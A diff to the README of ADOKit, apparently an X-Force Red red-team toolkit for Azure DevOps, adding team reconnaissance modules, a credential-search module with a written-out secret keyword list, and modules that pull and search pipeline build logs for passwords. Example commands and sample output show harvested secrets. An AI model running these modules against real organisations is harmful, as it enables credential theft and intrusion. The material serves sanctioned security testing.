@@ -8,7 +8,7 @@ Full details on the techniques used by ADOKit are in the X-Force Red [whitepaper
 
 
 ## Release
-* Version 1.2 of ADOKit can be found in Releases
+* Version 1.3 of ADOKit can be found in Releases
 
 ## Table of Contents
 
@@ -34,10 +34,17 @@ Full details on the techniques used by ADOKit are in the X-Force Red [whitepaper
     - [Search Files](#Search-files)
     - [List Users](#list-users)
     - [Search User](#search-user)
+    - [List Teams](#list-teams)
+    - [Search Team](#search-team)
+    - [Get Team Members](#get-team-members)
     - [List Groups](#list-groups)
     - [Search Groups](#search-groups)
     - [Get Group Members](#get-group-members)
     - [Get Project Permissions](#get-project-permissions)
+    - [Creds Search](#creds-search)
+    - [Get Build Logs](#get-build-logs)
+    - [List Build Logs](#list-build-logs)
+    - [Search Build Logs](#search-build-logs)
   - Persistence
     - [Create PAT](#create-pat)
     - [List PATs](#list-pats)
@@ -60,7 +67,7 @@ Full details on the techniques used by ADOKit are in the X-Force Red [whitepaper
     - [Remove Collection Service Account](#remove-collection-service-account)
     - [Get Pipeline Variables](#get-pipeline-variables)
     - [Get Pipeline Secrets](#get-pipeline-secrets)
-	- [Get Variable Groups](#get-variable-groups)
+    - [Get Variable Groups](#get-variable-groups)
     - [Get Service Connections](#get-service-connections)
 - [Detection](#detection)
 - [Roadmap](#roadmap)
@@ -106,10 +113,18 @@ Take the below steps to setup Visual Studio in order to compile the project your
   * <b>searchfile</b> - Search for file based on a search term
   * <b>listuser</b> - List users
   * <b>searchuser</b> - Search for a given user
+  * <b>listteam</b> - List teams
+  * <b>searchteam</b> - Search for a given team
+  * <b>getteammembers</b> - Get team members for a given team
   * <b>listgroup</b> - List groups
   * <b>searchgroup</b> - Search for a given group
   * <b>getgroupmembers</b> - List all group members for a given group
   * <b>getpermissions</b> - Get the permissions for who has access to a given project
+  * <b>creds</b> - Search for credentials in code (keywords listed below)
+    * ``` "pw OR pwd OR passwrod OR password OR \"-----BEGIN PGP PRIVATE KEY BLOCK-----\" OR \"-----BEGIN EC PRIVATE KEY-----\" OR \"-----BEGIN DSA PRIVATE KEY-----\" OR \"-----BEGIN OPENSSH PRIVATE KEY-----\" OR \"-----BEGIN RSA PRIVATE KEY-----\" OR ANSIBLE_VAULT OR AWS_ACCESS_KEY_ID OR AWS_SECRET_ACCESS_KEY OR ACCESS_TOKEN OR API_KEY OR Authorization OR db_password" ```
+  * <b>getbuildlogs</b> - Download the build logs for one or all projects
+  * <b>listbuildlogs</b> - List the build logs for one or all projects
+  * <b>searchbuildlogs</b> - Search build logs for a given search term
 * Persistence
   * <b>createpat</b> - Create personal access token for user
   * <b>listpat</b> - List personal access tokens for user
@@ -174,10 +189,17 @@ Recon | `searchcode` |  No |
 Recon | `searchfile` |  No | 
 Recon | `listuser` |  No | 
 Recon | `searchuser` |  No |
+Recon | `listteam` |  No | 
+Recon | `searchteam` |  No |
+Recon | `getteammembers` |  No | 
 Recon | `listgroup` |  No | 
 Recon | `searchgroup` |  No |
 Recon | `getgroupmembers` |  No |
 Recon | `getpermissions` |  No |
+Recon | `creds` |  No | 
+Recon | `getbuildlogs` |  Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` | 
+Recon | `listbuildlogs` |  Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` |
+Recon | `searchbuildlogs` |  Yes - `Contributors` or `Readers` or `Build Administrators` or `Project Administrators` or `Project Team Member` or `Project Collection Test Service Accounts` or `Project Collection Build Service Accounts` or `Project Collection Build Administrators` or `Project Collection Service Accounts` or `Project Collection Administrators` | 
 Persistence | `createpat` |  No | 
 Persistence | `listpat` |  No | 
 Persistence | `removepat` |  No | 
@@ -561,6 +583,212 @@ https://dev.azure.com/YourOrganization/TestProject/_git/fbcf0d6d-3973-4565-b641-
 
 ```
 
+### Creds Search
+
+#### Use Case
+
+> *Search for code containing secrets such as passwords or API keys in Azure DevOps*
+
+#### Syntax
+
+Provide the `creds` module, along with any relevant authentication information and URL. This will output the URL to the matching file in its respective repository, and the matching line(s) where creds are present.
+
+`ADOKit.exe creds /credential:apiKey /url:https://dev.azure.com/organizationName`
+
+`ADOKit.exe creds /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`
+
+#### Example Output
+
+```
+C:\>ADOKit.exe creds /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/YourOrganization
+
+==================================================
+Module:         creds
+Auth Type:      Cookie
+Search Term:    pw OR pwd OR passwrod OR password OR \"-----BEGIN PGP PRIVATE KEY BLOCK-----\" OR \"-----BEGIN EC PRIVATE KEY-----\" OR \"-----BEGIN DSA PRIVATE KEY-----\" OR \"-----BEGIN OPENSSH PRIVATE KEY-----\" OR \"-----BEGIN RSA PRIVATE KEY-----\" OR ANSIBLE_VAULT OR AWS_ACCESS_KEY_ID OR AWS_SECRET_ACCESS_KEY OR ACCESS_TOKEN OR API_KEY OR Authorization OR db_password
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      3/30/2023 10:17:49 AM
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+
+[>] URL: https://dev.azure.com/YourOrganization/MaraudersMap/_git/MaraudersMap?path=/Test.cs
+    |_ Console.WriteLine("PassWord");
+    |_ this is some text that has a password in it
+
+[>] URL: https://dev.azure.com/YourOrganization/MaraudersMap/_git/MaraudersMap?path=/Test.cs
+    |_ API_KEY=ABC123
+
+[>] URL: https://dev.azure.com/YourOrganization/TestProject2/_git/TestProject2?path=/Program.cs
+    |_ Console.WriteLine("PaSsWoRd");
+
+[>] URL: https://dev.azure.com/YourOrganization/ProjectWithMultipleRepos/_git/AnotherRepo?path=/config.yaml
+    |_ Password: ItIsSuperSecret!
+
+[*] Match count : 5
+
+3/30/23 14:17:54 Finished execution of creds
+
+```
+
+
+### Get Build Logs
+
+#### Use Case
+
+> *Download the logs of all the pipeline runs (build logs). You can then search offline for information and/or secrets.*
+
+#### Syntax
+
+Provide the `getbuildlogs` module along with a `/project:` for a given project to download all the build logs for this project. If you would like to download them for all projects, specify `all` in the `/project:` argument. This will create a folder of `ADOKit-[random 8 chars]` in your current working directory to download the logs to.
+
+`ADOKit.exe getbuildlogs /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject"`
+
+`ADOKit.exe getbuildlogs /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all"`
+
+`ADOKit.exe getbuildlogs /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/organizationName /project:"someProject"`
+
+`ADOKit.exe getbuildlogs /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/organizationName /project:"all"`
+
+
+#### Example Output
+
+```
+C:\>ADOKit.exe getbuildlogs /credential:apiKey /url:https://dev.azure.com/YourOrganization /project:TestProject2
+
+==================================================
+Module:         getbuildlogs
+Auth Type:      API Key
+Project:        TestProject2
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      5/31/2024 8:15:27 AM
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Downloading build logs to: C:\path\ADOKit-MWPsicSZ
+
+[+] SUCCESS: Build log files downloaded to: C:\path\ADOKit-MWPsicSZ
+
+```
+
+### List Build Logs
+
+#### Use Case
+
+> *List the build logs available for a given project or all projects.*
+
+#### Syntax
+
+Provide the `listbuildlogs` module along with a `/project:` for a given project to list all the build logs for this project. If you would like to list them for all projects, specify `all` in the `/project:` argument. 
+
+`ADOKit.exe listbuildlogs /credential:apiKey /url:https://dev.azure.com/organizationName /project:"someProject"`
+
+`ADOKit.exe listbuildlogs /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all"`
+
+`ADOKit.exe listbuildlogs /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/organizationName /project:"someProject"`
+
+`ADOKit.exe listbuildlogs /credential:UserAuthentication=ABC123 /url:https://dev.azure.com/organizationName /project:"all"`
+
+
+#### Example Output
+
+```
+C:\>ADOKit.exe listbuildlogs /credential:apiKey /url:https://dev.azure.com/YourOrganization /project:TestProject2
+
+==================================================
+Module:         listbuildlogs
+Auth Type:      API Key
+Project:        TestProject2
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      5/31/2024 8:14:57 AM
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+  Build ID |                     Build Name |   Num Logs |                                                URL
+-------------------------------------------------------------------------------------------------------------
+        94 |                   TestProject2 |         10 | https://dev.azure.com/YourOrganization/8f555d6f-88d2-414a-a9e9-55b1aef12173/_apis/build/Builds/94
+        92 |                   TestProject2 |         10 | https://dev.azure.com/YourOrganization/8f555d6f-88d2-414a-a9e9-55b1aef12173/_apis/build/Builds/92
+        64 |                   TestProject2 |         10 | https://dev.azure.com/YourOrganization/8f555d6f-88d2-414a-a9e9-55b1aef12173/_apis/build/Builds/64
+
+```
+
+### Search Build Logs
+
+#### Use Case
+
+> *Search for build logs containing a given keyword in Azure DevOps instance*
+
+#### Syntax
+
+Provide the `searchbuildlogs` module and your search criteria in the `/search:` command-line argument, along with a `/project:` for a given project to search all the build logs for this project. If you would like to search build logs for all projects, specify `all` in the `/project:` argument. This will output the URL to the matching build output log file, along with the line in the build log that matched.
+
+`ADOKit.exe searchbuildlogs /credential:apiKey /url:https://dev.azure.com/organizationName /project:"projName" /search:"password"`
+
+`ADOKit.exe searchbuildlogs /credential:apiKey /url:https://dev.azure.com/organizationName /project:"all" /search:"password"`
+
+`ADOKit.exe searchbuildlogs /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"projName" /search:"password"`
+
+`ADOKit.exe searchbuildlogs /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /project:"all" /search:"password"`
+
+
+#### Example Output
+
+```
+C:\>ADOKit.exe searchbuildlogs /credential:apiKey /url:https://dev.azure.com/YourOrganization /project:MaraudersMap /search:"password"
+
+==================================================
+Module:         searchbuildlogs
+Auth Type:      API Key
+Search Term:    password
+Project:        MaraudersMap
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      5/31/2024 9:06:20 AM
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+[*] INFO: Searching build logs
+
+
+[>] URL: https://dev.azure.com/YourOrganization/ee8c003f-94e1-40a7-8d97-0192dcf1b87a/_apis/build/builds/95/logs/1
+[>] Project: MaraudersMap
+    |_ python blah.py $(secret-password-here)
+
+
+[>] URL: https://dev.azure.com/YourOrganization/ee8c003f-94e1-40a7-8d97-0192dcf1b87a/_apis/build/builds/95/logs/7
+[>] Project: MaraudersMap
+    |_ 2023-04-21T14:36:48.8967630Z Downloading secret value for: secret-password-here.
+
+
+[>] URL: https://dev.azure.com/YourOrganization/ee8c003f-94e1-40a7-8d97-0192dcf1b87a/_apis/build/builds/95/logs/8
+[>] Project: MaraudersMap
+    |_ 2023-04-21T14:36:50.1585893Z Password1
+
+
+-----------SNIP-----------
+
+[*] Match count : 9
+```
+
 
 ### Create PAT
 
@@ -896,6 +1124,132 @@ Timestamp:      4/3/2023 4:12:23 PM
 4/3/23 20:12:24 Finished execution of searchuser
 
 ```
+
+
+### List Teams
+
+#### Use Case
+
+> *List teams within an Azure DevOps instance*
+
+#### Syntax
+
+Provide the `listteam` module, along with any relevant authentication information and URL. This will output the team name, project name and team description.
+
+`ADOKit.exe listteam /credential:apiKey /url:https://dev.azure.com/organizationName`
+
+`ADOKit.exe listteam /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName`
+
+#### Example Output
+
+```
+C:\>ADOKit.exe listteam /credential:apiKey /url:https://dev.azure.com/YourOrganization
+
+==================================================
+Module:         listteam
+Auth Type:      API Key
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      5/31/2024 9:48:26 AM
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+                                         Team Name |                        Project |                                        Description
+----------------------------------------------------------------------------------------------------------------------------------------
+                     ProjectWithMultipleRepos Team |       ProjectWithMultipleRepos |                          The default project team.
+                                 MaraudersMap Team |                   MaraudersMap |                          The default project team.
+                                 TestProject2 Team |                   TestProject2 |                          The default project team.
+                                  TestProject Team |                    TestProject |                          The default project team.
+
+```
+
+### Search Team
+
+#### Use Case
+
+> *Search for given team(s) in Azure DevOps instance*
+
+#### Syntax
+
+Provide the `searchteam` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the team name, project name and team description.
+
+`ADOKit.exe searchteam /credential:apiKey /url:https://dev.azure.com/organizationName /search:someTeam`
+
+`ADOKit.exe searchteam /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:someTeam`
+
+#### Example Output
+
+```
+C:\>ADOKit.exe searchteam /credential:apiKey /url:https://dev.azure.com/YourOrganization /search:test
+
+==================================================
+Module:         searchteam
+Auth Type:      API Key
+Search Term:    test
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      5/31/2024 9:48:32 AM
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+                                         Team Name |                        Project |                                        Description
+----------------------------------------------------------------------------------------------------------------------------------------
+                                 TestProject2 Team |                   TestProject2 |                          The default project team.
+                                  TestProject Team |                    TestProject |                          The default project team.
+
+```
+
+
+### Get Team Members
+
+#### Use Case
+
+> *Get team members for a given team*
+
+#### Syntax
+
+Provide the `getteammembers` module and your search criteria in the `/search:` command-line argument, along with any relevant authentication information and URL. This will output the team name, team member username, and team member display name.
+
+`ADOKit.exe getteammembers /credential:apiKey /url:https://dev.azure.com/organizationName /search:someTeam`
+
+`ADOKit.exe getteammembers /credential:"UserAuthentication=ABC123" /url:https://dev.azure.com/organizationName /search:someTeam`
+
+#### Example Output
+
+```
+C:\source\ADOKit-main\ADOKit\bin\Release>ADOKit.exe getteammembers /credential:apiKey /url:https://dev.azure.com/YourOrganization /search:"dev team"
+
+==================================================
+Module:         getteammembers
+Auth Type:      API Key
+Search Term:    dev team
+Target URL:     https://dev.azure.com/YourOrganization
+
+Timestamp:      5/31/2024 10:45:11 AM
+==================================================
+
+
+[*] INFO: Checking credentials provided
+
+[+] SUCCESS: Credentials provided are VALID.
+
+                                         Team Name |                                     Username |                                  User Display Name
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+                                          Dev Team |             user1@YourTenant.onmicrosoft.com |                                             User 1
+                                          Dev Team |             user3@YourTenant.onmicrosoft.com |                                              user3
+                                          Dev Team |             user4@YourTenant.onmicrosoft.com |                                              user4
+
+```
+
+
 
 ### List Groups
 
